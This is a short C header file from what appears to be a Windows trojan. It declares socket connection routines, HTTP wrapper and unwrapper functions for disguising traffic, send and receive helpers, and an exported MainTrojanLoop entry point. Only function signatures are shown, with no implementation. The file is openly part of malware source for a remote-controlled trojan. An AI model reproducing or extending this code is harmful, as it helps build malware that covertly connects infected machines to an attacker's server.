#pragma once

#include "stdafx.h"
#include "config.h"

extern "C" 
{
	struct Connection
	{
		SOCKET s;
		struct sockaddr_in * serv;
	};

	CHAR * http_warpper(char *sendBuf, const char *data);

	CHAR * http_dewarpper(char *, int);

	__declspec(dllexport) struct Connection * buildConnection(const char * ip, int port);

	void destoryConnection(struct Connection *);

	DWORD sendDataConnection(struct Connection *, char *);

	DWORD recvDataConnection(struct Connection *, char *);

	__declspec(dllexport) BOOL WINAPI MainTrojanLoop();
}